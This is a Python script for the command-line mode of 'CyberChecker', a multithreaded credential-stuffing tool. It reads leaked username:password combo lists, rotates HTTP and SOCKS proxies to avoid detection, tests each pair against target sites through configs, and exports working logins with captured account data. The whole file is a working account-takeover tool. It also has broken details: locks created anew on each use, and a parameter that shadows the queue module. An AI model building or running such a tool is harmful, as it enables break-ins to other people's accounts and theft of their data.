#!/usr/bin/env python3
"""
CyberChecker CLI Mode
This script provides a command-line interface to use the CyberChecker functionality
without requiring a GUI.
"""

import os
import sys
import re
import time
import threading
import json
import queue
import argparse
from datetime import datetime, timedelta

# Do not load Kivy in CLI mode - Create direct imports of the utility modules
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# Import our utility modules directly (without depending on utils/__init__.py which might import Kivy)
from utils.config_manager import ConfigManager
from utils.http_client import HttpClient

def format_time(seconds):
    """Format seconds to HH:MM:SS"""
    return str(timedelta(seconds=seconds)).split('.')[0]

def ensure_directory(directory):
    """Ensure a directory exists"""
    if not os.path.exists(directory):
        os.makedirs(directory)

class ConsoleChecker:
    """CLI version of CyberChecker for testing and basic usage"""
    
    def __init__(self):
        self.config_manager = ConfigManager()
        self.http_client = HttpClient()
        
        # Stats
        self.stats = {
            'checked': 0,
            'hits': 0,
            'tocheck': 0,
            'deads': 0,
            'start_time': 0,
            'cpm': 0,
            'last_checked': 0,
            'last_cpm_update': 0
        }
        
        # Results storage
        self.hits = []
        self.free = []
        self.logs = []
        
        # Worker control
        self.is_checking = False
        self.pause_event = threading.Event()
        
        # Initialize dirs
        ensure_directory('configs')
        ensure_directory('results')
    
    def log(self, message):
        """Add a log message"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        log_line = f"[{timestamp}] {message}"
        self.logs.append(log_line)
        print(log_line)
    
    def list_configs(self):
        """List available configurations"""
        configs = self.config_manager.get_config_files()
        if not configs:
            self.log("No configurations found.")
            return
        
        self.log("Available configurations:")
        for i, config_name in enumerate(configs, 1):
            self.log(f"{i}. {config_name}")
    
    def check_combo(self, config_name, combo_file, proxy_file=None, proxy_type='None', threads=10, timeout=10):
        """Main checking function"""
        # Load config
        config = self.config_manager.load_config(config_name)
        if not config:
            self.log(f"Error: Config '{config_name}' not found.")
            return False
        
        # Check combo file
        if not os.path.exists(combo_file):
            self.log(f"Error: Combo file '{combo_file}' not found.")
            return False
        
        # Check proxy file if provided
        proxies = []
        if proxy_file and proxy_type != 'None':
            if not os.path.exists(proxy_file):
                self.log(f"Error: Proxy file '{proxy_file}' not found.")
                return False
            
            try:
                with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
                    proxies = [line.strip() for line in f if line.strip()]
                
                if not proxies:
                    self.log("Warning: Proxy file is empty, continuing without proxies.")
            except Exception as e:
                self.log(f"Error reading proxies file: {str(e)}")
                return False
        
        # Count lines to update tocheck
        try:
            with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                line_count = sum(1 for _ in f)
            self.stats['tocheck'] = line_count
            self.log(f"Loaded combo file: {os.path.basename(combo_file)} ({line_count} lines)")
        except Exception as e:
            self.log(f"Error counting lines in combo file: {str(e)}")
            return False
        
        # Reset stats
        self.stats = {
            'checked': 0,
            'hits': 0,
            'tocheck': line_count,
            'deads': 0,
            'start_time': time.time(),
            'cpm': 0,
            'last_checked': 0,
            'last_cpm_update': time.time()
        }
        
        # Clear previous results
        self.hits = []
        self.free = []
        
        self.log(f"Starting checking process with {threads} threads and {timeout}s timeout...")
        
        # Create a queue for combo lines
        combo_queue = queue.Queue()
        
        # Fill the queue with combo lines
        try:
            with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        combo_queue.put(line)
        except Exception as e:
            self.log(f"Error reading combo file: {str(e)}")
            return False
        
        # Start worker threads
        self.is_checking = True
        self.pause_event.clear()
        self.worker_threads = []
        
        for _ in range(threads):
            t = threading.Thread(
                target=self.worker_thread,
                args=(combo_queue, config, proxies, proxy_type, timeout, self.pause_event),
                daemon=True
            )
            t.start()
            self.worker_threads.append(t)
        
        # Monitor progress
        try:
            while self.is_checking and any(t.is_alive() for t in self.worker_threads):
                self.update_stats()
                self.display_progress()
                
                # Check if all done
                if self.stats['checked'] >= self.stats['tocheck']:
                    self.is_checking = False
                    break
                
                time.sleep(1)
            
            # Ensure we join all threads
            for t in self.worker_threads:
                t.join(0.1)
                
            # Display final stats
            self.update_stats()
            self.display_progress()
            self.log("Checking completed.")
            
            # Save results
            self.export_results()
            
            return True
            
        except KeyboardInterrupt:
            self.log("Interrupted by user. Stopping threads...")
            self.pause_event.set()
            self.is_checking = False
            
            # Wait for threads to finish
            for t in self.worker_threads:
                t.join(0.1)
            
            self.log("Stopped.")
            return False
    
    def worker_thread(self, queue, config, proxies, proxy_type, timeout, pause_event):
        """Worker thread for checking"""
        http_client = HttpClient(timeout=timeout)
        
        proxy_index = 0
        proxy = None
        
        while not pause_event.is_set():
            try:
                # Get next combo line
                try:
                    combo_line = queue.get(block=False)
                except queue.Empty:
                    # No more work to do
                    break
                
                # Set proxy if needed
                if proxies and proxy_type != 'None':
                    if proxy_index >= len(proxies):
                        proxy_index = 0
                    
                    proxy_str = proxies[proxy_index]
                    proxy_index += 1
                    
                    try:
                        if proxy_type == 'HTTP':
                            proxy = {
                                'http': f'http://{proxy_str}',
                                'https': f'http://{proxy_str}'
                            }
                        elif proxy_type == 'SOCKS4':
                            proxy = {
                                'http': f'socks4://{proxy_str}',
                                'https': f'socks4://{proxy_str}'
                            }
                        elif proxy_type == 'SOCKS5':
                            proxy = {
                                'http': f'socks5://{proxy_str}',
                                'https': f'socks5://{proxy_str}'
                            }
                        
                        http_client.set_proxy(proxy)
                    except Exception as e:
                        print(f"Error setting proxy: {str(e)}")
                        http_client.clear_proxy()
                
                # Parse the combo line
                if ':' in combo_line:
                    parts = combo_line.split(':', 1)
                    username, password = parts[0], parts[1]
                    
                    # Check the account
                    result = self.check_account(username, password, config, http_client, proxy)
                    
                    # Process the result
                    self.process_result(result, combo_line)
                    
                    # Mark as checked
                    with threading.Lock():
                        self.stats['checked'] += 1
                
                # Small delay to prevent hammering
                time.sleep(0.05)
                
            except Exception as e:
                print(f"Worker error: {str(e)}")
                # Continue to next combo
                continue
    
    def check_account(self, username, password, config, http_client, proxy=None):
        """Check an account using the selected config"""
        result = {
            'username': username,
            'password': password,
            'proxy': str(proxy) if proxy else 'None',
            'success': False,
            'failure': False,
            'error': False,
            'error_message': '',
            'captured_data': {}
        }
        
        try:
            # Check the account using the configuration
            check_result = http_client.check_with_config(username, password, config)
            
            # Update result with check result
            result.update(check_result)
            
        except Exception as e:
            result['error'] = True
            result['error_message'] = str(e)
        
        return result
    
    def process_result(self, result, combo_line):
        """Process a result from a worker thread"""
        if result['error']:
            # Handle error
            with threading.Lock():
                self.stats['deads'] += 1
            return
        
        if result['success']:
            # Handle hit
            with threading.Lock():
                self.stats['hits'] += 1
            
            # Format the result for display
            captured = []
            for name, value in result['captured_data'].items():
                captured.append(f"{name}: {value}")
            
            capture_text = ' | '.join(captured) if captured else ''
            display_text = f"{combo_line}"
            
            if capture_text:
                display_text += f" | {capture_text}"
            
            # Add to hits
            self.hits.append(display_text)
        elif result['failure']:
            # Handle dead
            with threading.Lock():
                self.stats['deads'] += 1
        else:
            # Handle free (neither hit nor explicitly dead)
            self.free.append(combo_line)
    
    def update_stats(self):
        """Update the statistics"""
        current_time = time.time()
        elapsed = current_time - self.stats.get('start_time', current_time)
        
        # Only update CPM every second
        if current_time - self.stats.get('last_cpm_update', 0) >= 1.0:
            # Calculate checks in the last interval
            checks_diff = self.stats['checked'] - self.stats.get('last_checked', 0)
            self.stats['last_checked'] = self.stats['checked']
            self.stats['last_cpm_update'] = current_time
            
            # Update CPM with some smoothing
            new_cpm = checks_diff * 60  # Convert to per minute
            if self.stats['cpm'] == 0:
                self.stats['cpm'] = new_cpm
            else:
                # Smooth CPM changes
                self.stats['cpm'] = (self.stats['cpm'] * 0.6) + (new_cpm * 0.4)
    
    def display_progress(self):
        """Display progress in terminal"""
        current_time = time.time()
        elapsed = current_time - self.stats.get('start_time', current_time)
        elapsed_str = format_time(int(elapsed))
        
        # Calculate progress percentage
        if self.stats['tocheck'] > 0:
            progress = (self.stats['checked'] / self.stats['tocheck']) * 100
        else:
            progress = 0
        
        # Clear line and print status
        sys.stdout.write('\r' + ' ' * 80 + '\r')
        status = (
            f"Progress: {progress:.1f}% | "
            f"Checked: {self.stats['checked']}/{self.stats['tocheck']} | "
            f"Hits: {self.stats['hits']} | "
            f"CPM: {int(self.stats['cpm'])} | "
            f"Elapsed: {elapsed_str}"
        )
        sys.stdout.write(status)
        sys.stdout.flush()
    
    def export_results(self):
        """Export results to files"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        results_dir = 'results'
        ensure_directory(results_dir)
        
        # Define filenames
        hits_file = os.path.join(results_dir, f"hits_{timestamp}.txt")
        free_file = os.path.join(results_dir, f"free_{timestamp}.txt")
        log_file = os.path.join(results_dir, f"log_{timestamp}.txt")
        
        # Export hits
        with open(hits_file, 'w', encoding='utf-8') as f:
            for line in self.hits:
                f.write(line + '\n')
        
        # Export free
        with open(free_file, 'w', encoding='utf-8') as f:
            for line in self.free:
                f.write(line + '\n')
        
        # Export logs
        with open(log_file, 'w', encoding='utf-8') as f:
            for line in self.logs:
                f.write(line + '\n')
        
        self.log(f"\nResults exported to '{results_dir}' directory:")
        self.log(f"- Hits: {len(self.hits)} saved to {hits_file}")
        self.log(f"- Free: {len(self.free)} saved to {free_file}")
        self.log(f"- Logs: {len(self.logs)} saved to {log_file}")


def main():
    """Main function for CLI mode"""
    parser = argparse.ArgumentParser(description='CyberChecker CLI Mode')
    
    # Command modes
    subparsers = parser.add_subparsers(dest='command', help='Command')
    
    # List configs command
    list_parser = subparsers.add_parser('list', help='List available configurations')
    
    # Check command
    check_parser = subparsers.add_parser('check', help='Check a combo with specified configuration')
    check_parser.add_argument('config', help='Configuration name to use')
    check_parser.add_argument('combo', help='Path to combo file')
    check_parser.add_argument('-p', '--proxy', help='Path to proxy file (optional)')
    check_parser.add_argument('-t', '--proxy-type', choices=['None', 'HTTP', 'SOCKS4', 'SOCKS5'], 
                         default='None', help='Proxy type (default: None)')
    check_parser.add_argument('-n', '--threads', type=int, default=10,
                         help='Number of threads (default: 10)')
    check_parser.add_argument('-o', '--timeout', type=int, default=10,
                         help='Request timeout in seconds (default: 10)')
    
    args = parser.parse_args()
    
    checker = ConsoleChecker()
    checker.log("CyberChecker CLI Mode")
    
    if args.command == 'list':
        checker.list_configs()
    elif args.command == 'check':
        checker.check_combo(
            args.config, 
            args.combo,
            args.proxy,
            args.proxy_type,
            args.threads,
            args.timeout
        )
    else:
        parser.print_help()

if __name__ == '__main__':
    main()